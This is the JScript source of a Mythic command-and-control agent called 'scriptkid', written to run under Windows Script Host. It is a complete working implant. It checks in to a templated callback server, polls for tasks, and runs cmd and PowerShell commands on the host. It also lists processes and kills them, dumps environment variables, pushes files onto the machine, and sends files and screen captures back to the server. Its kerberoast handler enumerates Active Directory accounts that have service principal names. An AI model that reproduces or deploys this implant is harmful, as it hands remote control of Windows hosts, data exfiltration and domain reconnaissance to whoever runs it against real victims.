// scriptkid.js - Mythic scriptkid agent, JScript dialect.
// Status: all JScript command handlers implemented.
// Scope: see docs/minimal-agent-feature-set.md "JScript / VBScript scope".
// Build pipeline substitutes the __UPPER__ tokens at render time.
// mythic_encrypts = False in builder.py, so messages are base64 only.

var AGENT = {
    uuid: "__UUID__",
    callback_host: "__CALLBACK_HOST__",
    callback_port: "__CALLBACK_PORT__",
    get_uri: "__GET_URI__",
    post_uri: "__POST_URI__",
    query_path_name: "__QUERY_PATH_NAME__",
    callback_interval: parseInt("__CALLBACK_INTERVAL__", 10) || 10,
    callback_jitter: parseInt("__CALLBACK_JITTER__", 10) || 0,
    profile_headers: __PROFILE_HEADERS__,
    jobs: {}
};

// JScript (WSH) has no JSON global. Minimal inline polyfill.
if (typeof JSON === "undefined") { JSON = {}; }
if (typeof JSON.stringify !== "function") {
    JSON.stringify = (function () {
        function esc(s) {
            return s.replace(/[\\"\x00-\x1f]/g, function (c) {
                if (c === "\\") return "\\\\";
                if (c === "\"") return "\\\"";
                if (c === "\n") return "\\n";
                if (c === "\r") return "\\r";
                if (c === "\t") return "\\t";
                if (c === "\b") return "\\b";
                if (c === "\f") return "\\f";
                var h = c.charCodeAt(0).toString(16);
                while (h.length < 4) h = "0" + h;
                return "\\u" + h;
            });
        }
        function enc(v) {
            if (v === null || v === undefined) return "null";
            var t = typeof v;
            if (t === "string") return "\"" + esc(v) + "\"";
            if (t === "number") return isFinite(v) ? String(v) : "null";
            if (t === "boolean") return v ? "true" : "false";
            if (v && typeof v.length === "number" && typeof v.push === "function") {
                var out = [];
                for (var i = 0; i < v.length; i++) out.push(enc(v[i]));
                return "[" + out.join(",") + "]";
            }
            if (t === "object") {
                var parts = [];
                for (var k in v) {
                    if (!v.hasOwnProperty || v.hasOwnProperty(k)) {
                        var vv = v[k];
                        if (typeof vv !== "function" && typeof vv !== "undefined") {
                            parts.push("\"" + esc(k) + "\":" + enc(vv));
                        }
                    }
                }
                return "{" + parts.join(",") + "}";
            }
            return "null";
        }
        return enc;
    })();
}
if (typeof JSON.parse !== "function") {
    JSON.parse = function (s) { return eval("(" + s + ")"); };
}

function sleepMs(ms) { WScript.Sleep(ms); }
function nextSleep() {
    var base = AGENT.callback_interval * 1000;
    var j = AGENT.callback_jitter;
    if (j <= 0) return base;
    var pct = (Math.random() * 2 * j - j) / 100.0;
    var v = Math.round(base * (1 + pct));
    return v < 1000 ? 1000 : v;
}

var B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var B64L = {};
(function(){ for (var i = 0; i < 64; i++) B64L[B64C.charAt(i)] = i; })();
function b64encode(str) {
    var o = "", len = str.length, i = 0;
    while (i < len) {
        var a = str.charCodeAt(i++) & 0xff;
        var b = i < len ? str.charCodeAt(i++) & 0xff : -1;
        var c = i < len ? str.charCodeAt(i++) & 0xff : -1;
        o += B64C.charAt(a >> 2);
        o += B64C.charAt(((a & 3) << 4) | (b >= 0 ? (b >> 4) : 0));
        o += b >= 0 ? B64C.charAt(((b & 15) << 2) | (c >= 0 ? (c >> 6) : 0)) : "=";
        o += c >= 0 ? B64C.charAt(c & 63) : "=";
    }
    return o;
}
function b64decode(s) {
    var o = "", len = s.length, i = 0;
    while (i < len) {
        var a = B64L[s.charAt(i++)] || 0;
        var b = B64L[s.charAt(i++)] || 0;
        var c3 = s.charAt(i++), c = c3 === "=" ? -1 : (B64L[c3] || 0);
        var d4 = s.charAt(i++), d = d4 === "=" ? -1 : (B64L[d4] || 0);
        o += String.fromCharCode((a << 2) | (b >> 4));
        if (c >= 0) o += String.fromCharCode(((b & 15) << 4) | (c >> 2));
        if (d >= 0) o += String.fromCharCode(((c & 3) << 6) | d);
    }
    return o;
}

function buildUrl() {
    var host = AGENT.callback_host;
    var port = AGENT.callback_port;
    var uri = AGENT.post_uri || "";
    if (uri.length && uri.charAt(0) !== "/") uri = "/" + uri;
    var needsPort = true;
    if (host.indexOf("http://") === 0 && String(port) === "80") needsPort = false;
    if (host.indexOf("https://") === 0 && String(port) === "443") needsPort = false;
    return host + (needsPort ? ":" + port : "") + uri;
}

function dbg(msg) {
    try { WScript.StdErr.WriteLine(msg); } catch (e) {}
}

function postMessage(obj) {
    var json = JSON.stringify(obj);
    var payload = b64encode(AGENT.uuid + json);
    var url = buildUrl();
    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
    xhr.setOption(2, 13056);
    xhr.open("POST", url, false);
    for (var k in AGENT.profile_headers) {
        try { xhr.setRequestHeader(k, AGENT.profile_headers[k]); } catch (e) {}
    }
    try {
        xhr.send(payload);
    } catch (e) {
        dbg("postMessage error: " + e.message + " url=" + url);
        return null;
    }
    if (xhr.status !== 200) {
        dbg("postMessage HTTP " + xhr.status + " url=" + url);
        return null;
    }
    var body = xhr.responseText;
    var decoded = b64decode(body);
    if (decoded.length <= 36) return null;
    try { return JSON.parse(decoded.substr(36)); } catch (e) { return null; }
}

function getSysInfo() {
    var sh = new ActiveXObject("WScript.Shell");
    var env = sh.Environment("Process");
    var net = new ActiveXObject("WScript.Network");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var pid = 0;
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='cscript.exe' OR Name='wscript.exe'");
        var e = new Enumerator(procs);
        for (; !e.atEnd(); e.moveNext()) { pid = e.item().ProcessId; break; }
    } catch (ex) {}
    return {
        action: "checkin",
        uuid: AGENT.uuid,
        ip: "0.0.0.0",
        os: String(env("OS") || "Windows"),
        user: String(net.UserName),
        host: String(net.ComputerName),
        domain: String(net.UserDomain),
        pid: pid,
        architecture: String(env("PROCESSOR_ARCHITECTURE") || "x64"),
        integrity_level: 2,
        process_name: "cscript.exe"
    };
}

// Per-command handler stubs. Each takes a parsed task object and must return
// a result object { user_output: string, completed: bool } or throw.
var fso = new ActiveXObject("Scripting.FileSystemObject");
var wshell = new ActiveXObject("WScript.Shell");

function getParam(task, name) {
    var p = task.parameters;
    if (typeof p === "string") { try { p = JSON.parse(p); } catch (e) { return p; } }
    if (typeof p === "object" && p !== null) {
        var v = p[name];
        if (v === undefined || v === null) return "";
        if (typeof v === "string") {
            try { var inner = JSON.parse(v); if (typeof inner === "object" && inner !== null && inner[name] !== undefined) return String(inner[name]); } catch (e) {}
        }
        return String(v);
    }
    return "";
}

var HANDLERS = {
    "help": function (task) {
        var cmds = [];
        for (var k in HANDLERS) cmds.push(k);
        return { user_output: "Available commands: " + cmds.join(", "), completed: true };
    },
    "exit": function (task) {
        try { WScript.Quit(0); } catch (e) {}
        return { user_output: "exiting", completed: true };
    },
    "pwd": function (task) {
        return { user_output: wshell.CurrentDirectory, completed: true };
    },
    "ls": function (task) {
        var params = task.parameters || "";
        var target = params.length ? params : wshell.CurrentDirectory;
        if (!fso.FolderExists(target)) return { user_output: "folder not found: " + target, completed: true, status: "error" };
        var folder = fso.GetFolder(target);
        var out = [];
        var subs = new Enumerator(folder.SubFolders);
        for (; !subs.atEnd(); subs.moveNext()) {
            var sf = subs.item();
            out.push("d\t" + sf.Name + "\t" + sf.DateLastModified);
        }
        var files = new Enumerator(folder.Files);
        for (; !files.atEnd(); files.moveNext()) {
            var fi = files.item();
            out.push("-\t" + fi.Name + "\t" + fi.Size + "\t" + fi.DateLastModified);
        }
        return { user_output: out.length ? out.join("\n") : "(empty)", completed: true };
    },
    "mkdir": function (task) {
        var params = task.parameters || "";
        if (!params.length) return { user_output: "usage: mkdir <path>", completed: true, status: "error" };
        fso.CreateFolder(params);
        return { user_output: "created " + params, completed: true };
    },
    "mv": function (task) {
        var params = task.parameters || "";
        var parts = params.split(" ");
        if (parts.length < 2) return { user_output: "usage: mv <src> <dst>", completed: true, status: "error" };
        var src = parts[0], dst = parts.slice(1).join(" ");
        if (fso.FileExists(src)) { fso.MoveFile(src, dst); }
        else if (fso.FolderExists(src)) { fso.MoveFolder(src, dst); }
        else { return { user_output: "not found: " + src, completed: true, status: "error" }; }
        return { user_output: "moved " + src + " -> " + dst, completed: true };
    },
    "cat": function (task) {
        var params = task.parameters || "";
        if (!params.length) return { user_output: "usage: cat <file>", completed: true, status: "error" };
        if (!fso.FileExists(params)) return { user_output: "file not found: " + params, completed: true, status: "error" };
        var ts = fso.OpenTextFile(params, 1);
        var content = ts.AtEndOfStream ? "" : ts.ReadAll();
        ts.Close();
        return { user_output: content, completed: true };
    },
    "upload": function (task) {
        var fileId = getParam(task, "file");
        var remotePath = getParam(task, "remote_path");
        var fullData = "";
        var chunkNum = 1;
        var totalChunks = 0;
        do {
            var resp = postMessage({
                action: "post_response",
                responses: [{
                    task_id: task.id,
                    upload: { file_id: fileId, chunk_num: chunkNum, chunk_size: 512000 }
                }]
            });
            if (!resp || !resp.responses || !resp.responses.length) break;
            var ur = resp.responses[0];
            totalChunks = ur.total_chunks || (ur.upload && ur.upload.total_chunks) || 0;
            var cd = ur.chunk_data || (ur.upload && ur.upload.chunk_data) || "";
            if (cd) fullData += cd;
            if (!totalChunks && !cd) break;
            chunkNum++;
        } while (chunkNum <= totalChunks);
        var xml = new ActiveXObject("MSXML2.DOMDocument");
        var node = xml.createElement("b64");
        node.dataType = "bin.base64";
        node.text = fullData;
        var ws = new ActiveXObject("ADODB.Stream");
        ws.Type = 1; ws.Open();
        ws.Write(node.nodeTypedValue);
        ws.SaveToFile(remotePath, 2);
        ws.Close();
        return { user_output: "uploaded " + remotePath + " (" + ws.Size + " bytes)", completed: true };
    },
    "download": function (task) {
        var filePath = getParam(task, "path");
        if (!fso.FileExists(filePath)) return { user_output: "file not found: " + filePath, completed: true, status: "error" };
        var rs = new ActiveXObject("ADODB.Stream");
        rs.Type = 1; rs.Open(); rs.LoadFromFile(filePath);
        var fileSize = rs.Size;
        var bytes = rs.Read(); rs.Close();
        var xml = new ActiveXObject("MSXML2.DOMDocument");
        var node = xml.createElement("b64");
        node.dataType = "bin.base64";
        node.nodeTypedValue = bytes;
        var encoded = node.text.replace(/\r?\n/g, "");
        var chunkSize = 512000;
        var totalChunks = Math.ceil(encoded.length / chunkSize) || 1;
        var resp = postMessage({
            action: "post_response",
            responses: [{
                task_id: task.id,
                download: { total_chunks: totalChunks, full_path: filePath, is_screenshot: false }
            }]
        });
        if (!resp || !resp.responses || !resp.responses.length || !resp.responses[0].file_id)
            return { user_output: "download init failed", completed: true, status: "error" };
        var fileId = resp.responses[0].file_id;
        for (var c = 0; c < totalChunks; c++) {
            var chunk = encoded.substr(c * chunkSize, chunkSize);
            postMessage({
                action: "post_response",
                responses: [{
                    task_id: task.id,
                    download: { file_id: fileId, chunk_num: c + 1, chunk_data: chunk }
                }]
            });
        }
        return { user_output: "downloaded " + filePath + " (" + fileSize + " bytes)", completed: true };
    },
    "ps": function (task) {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var procs = wmi.ExecQuery("SELECT ProcessId, Name, ParentProcessId FROM Win32_Process");
        var e = new Enumerator(procs);
        var out = ["PID\tPPID\tName"];
        for (; !e.atEnd(); e.moveNext()) {
            var p = e.item();
            out.push(p.ProcessId + "\t" + p.ParentProcessId + "\t" + p.Name);
        }
        return { user_output: out.join("\n"), completed: true };
    },
    "kill": function (task) {
        var params = task.parameters || "";
        if (!params.length) return { user_output: "usage: kill <pid>", completed: true, status: "error" };
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId=" + parseInt(params, 10));
        var e = new Enumerator(procs);
        if (e.atEnd()) return { user_output: "no process with pid " + params, completed: true, status: "error" };
        e.item().Terminate();
        return { user_output: "killed pid " + params, completed: true };
    },
    "jobs": function (task) {
        var out = [];
        for (var jid in AGENT.jobs) out.push(jid + ": " + AGENT.jobs[jid]);
        return { user_output: out.length ? out.join("\n") : "no active jobs", completed: true };
    },
    "jobkill": function (task) {
        var params = task.parameters || "";
        var jid = params.replace(/[^a-zA-Z0-9_-]/g, "");
        if (!jid.length) return { user_output: "usage: jobkill <job_id>", completed: true, status: "error" };
        if (AGENT.jobs[jid] === undefined) return { user_output: "no such job: " + jid, completed: true, status: "error" };
        delete AGENT.jobs[jid];
        return { user_output: "removed job " + jid, completed: true };
    },
    "env": function (task) {
        var env = wshell.Environment("Process");
        var out = [];
        for (var e = new Enumerator(env); !e.atEnd(); e.moveNext()) {
            out.push(String(e.item()));
        }
        return { user_output: out.join("\n"), completed: true };
    },
    "getprivs": function (task) {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var net = new ActiveXObject("WScript.Network");
        var groups = wmi.ExecQuery("ASSOCIATORS OF {Win32_Account.Name='" + net.UserName + "',Domain='" + net.UserDomain + "'} WHERE ResultRole=GroupComponent ResultClass=Win32_Group");
        var out = ["User: " + net.UserDomain + "\\" + net.UserName, "Groups:"];
        try {
            var e = new Enumerator(groups);
            for (; !e.atEnd(); e.moveNext()) out.push("  " + e.item().Name);
        } catch (ex) { out.push("  (could not enumerate groups: " + ex.message + ")"); }
        return { user_output: out.join("\n"), completed: true };
    },
    "process_spawn": function (task) {
        var params = task.parameters || "";
        if (!params.length) return { user_output: "usage: process_spawn <command>", completed: true, status: "error" };
        var exec = wshell.Exec(params);
        var stdout = "";
        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
        var stderr = "";
        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
        var out = stdout;
        if (stderr.length) out += "\n[stderr]\n" + stderr;
        return { user_output: out || "(no output)", completed: true };
    },
    "shell": function (task) {
        var cmd = getParam(task, "command");
        if (!cmd.length) return { user_output: "usage: shell <command>", completed: true, status: "error" };
        var run = wshell.ExpandEnvironmentStrings("%COMSPEC%") + " /c " + cmd;
        var exec = wshell.Exec(run);
        var stdout = "";
        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
        var stderr = "";
        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
        var out = stdout;
        if (stderr.length) out += "\n[stderr]\n" + stderr;
        return { user_output: out || "(no output)", completed: true };
    },
    "powershell": function (task) {
        var cmd = getParam(task, "command");
        if (!cmd.length) return { user_output: "usage: powershell <command>", completed: true, status: "error" };
        var exec = wshell.Exec("powershell.exe -NoProfile -NonInteractive -Command " + cmd);
        var stdout = "";
        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
        var stderr = "";
        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
        var out = stdout;
        if (stderr.length) out += "\n[stderr]\n" + stderr;
        return { user_output: out || "(no output)", completed: true };
    },
    "screenshot": function (task) {
        var tempPath = wshell.ExpandEnvironmentStrings("%TEMP%") + "\\~ss" + Math.floor(Math.random() * 99999) + ".png";
        var psCmd = 'powershell.exe -NoProfile -NonInteractive -Command "' +
            'Add-Type -AssemblyName System.Windows.Forms;' +
            'Add-Type -AssemblyName System.Drawing;' +
            '$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;' +
            '$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);' +
            '$g=[System.Drawing.Graphics]::FromImage($bmp);' +
            '$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);' +
            '$g.Dispose();' +
            "$bmp.Save('" + tempPath + "',[System.Drawing.Imaging.ImageFormat]::Png);" +
            '$bmp.Dispose()"';
        var exec = wshell.Exec(psCmd);
        while (exec.Status === 0) WScript.Sleep(100);
        if (!fso.FileExists(tempPath)) {
            var err = "";
            while (!exec.StdErr.AtEndOfStream) err += exec.StdErr.ReadLine() + "\n";
            return { user_output: "screenshot failed: " + (err || "no output file"), completed: true, status: "error" };
        }
        var rs = new ActiveXObject("ADODB.Stream");
        rs.Type = 1; rs.Open(); rs.LoadFromFile(tempPath);
        var fileSize = rs.Size;
        var bytes = rs.Read(); rs.Close();
        var xml = new ActiveXObject("MSXML2.DOMDocument");
        var node = xml.createElement("b64");
        node.dataType = "bin.base64";
        node.nodeTypedValue = bytes;
        var encoded = node.text.replace(/\r?\n/g, "");
        var chunkSize = 512000;
        var totalChunks = Math.ceil(encoded.length / chunkSize) || 1;
        var initResp = postMessage({
            action: "post_response",
            responses: [{
                task_id: task.id,
                download: { total_chunks: totalChunks, full_path: tempPath, is_screenshot: true }
            }]
        });
        if (!initResp || !initResp.responses || !initResp.responses.length || !initResp.responses[0].file_id) {
            try { fso.DeleteFile(tempPath); } catch (e) {}
            return { user_output: "screenshot transfer init failed", completed: true, status: "error" };
        }
        var fileId = initResp.responses[0].file_id;
        for (var c = 0; c < totalChunks; c++) {
            var chunk = encoded.substr(c * chunkSize, chunkSize);
            postMessage({
                action: "post_response",
                responses: [{
                    task_id: task.id,
                    download: { file_id: fileId, chunk_num: c + 1, chunk_data: chunk }
                }]
            });
        }
        try { fso.DeleteFile(tempPath); } catch (e) {}
        return { user_output: "screenshot captured (" + fileSize + " bytes)", completed: true };
    },
    "kerberoast": function (task) {
        var targetSpn = getParam(task, "spn");
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var ldap = GetObject("LDAP://rootDSE");
        var defaultNC = ldap.Get("defaultNamingContext");
        var query;
        if (targetSpn.length) {
            query = "<LDAP://" + defaultNC + ">;(&(servicePrincipalName=" + targetSpn + ")(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree";
        } else {
            query = "<LDAP://" + defaultNC + ">;(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree";
        }
        var conn = new ActiveXObject("ADODB.Connection");
        conn.Provider = "ADsDSOObject";
        conn.Open("Active Directory Provider");
        var rs = conn.Execute(query);
        var out = [];
        while (!rs.EOF) {
            var sam = rs.Fields("sAMAccountName").Value;
            var spns = rs.Fields("servicePrincipalName").Value;
            if (spns && typeof spns === "object" && spns.toArray) spns = spns.toArray().join("; ");
            out.push(sam + " | " + spns);
            rs.MoveNext();
        }
        rs.Close(); conn.Close();
        if (!out.length) return { user_output: "no SPN accounts found", completed: true };
        return { user_output: "SPN Accounts:\n" + out.join("\n"), completed: true };
    }
};

function dispatch(task) {
    var h = HANDLERS[task.command];
    if (!h) return { task_id: task.id, user_output: "unknown: " + task.command, completed: true, status: "error" };
    try {
        var r = h(task);
        return { task_id: task.id, user_output: (r && r.user_output) || "", completed: true };
    } catch (e) {
        return { task_id: task.id, user_output: String(e.message || e), completed: true, status: "error" };
    }
}

function main() {
    dbg("scriptkid connecting to " + buildUrl());
    var resp = postMessage(getSysInfo());
    if (!resp || !resp.id) {
        dbg("checkin failed - no callback id received");
        WScript.Quit(1);
    }
    dbg("checkin ok, callback id: " + resp.id);
    AGENT.uuid = resp.id;

    while (true) {
        var msg = { action: "get_tasking", tasking_size: 1 };
        var r = postMessage(msg);
        if (r && r.tasks && r.tasks.length) {
            var responses = [];
            for (var i = 0; i < r.tasks.length; i++) {
                responses.push(dispatch(r.tasks[i]));
            }
            postMessage({ action: "post_response", responses: responses });
        }
        sleepMs(nextSleep());
    }
}

main();
